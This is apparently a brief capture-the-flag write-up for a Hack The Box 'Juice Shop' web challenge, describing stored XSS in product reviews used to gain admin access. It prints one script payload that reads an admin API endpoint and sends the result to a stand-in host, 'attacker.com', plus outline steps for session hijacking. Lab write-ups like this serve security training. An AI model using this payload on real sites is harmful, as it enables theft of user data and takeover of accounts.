---
title: "HTB: Juice Shop - XSS to Admin"
platform: HTB
category: web
difficulty: Easy
points: 20
date: 2023-12-20
tags: [web, xss, authentication-bypass]
description: "Exploiting XSS vulnerability in a juice shop application to gain admin access"
---

# Juice Shop Walkthrough

## Overview
A vulnerable e-commerce application focused on juice products.

## Vulnerability Analysis
Found XSS in product review section:

```javascript
<script>fetch('/api/admin').then(r=>r.json()).then(d=>fetch('https://attacker.com?'+btoa(JSON.stringify(d))))</script>
```

## Admin Access
1. Injecting XSS payload in product reviews
2. Capturing admin session data
3. Escalating privileges through session hijacking
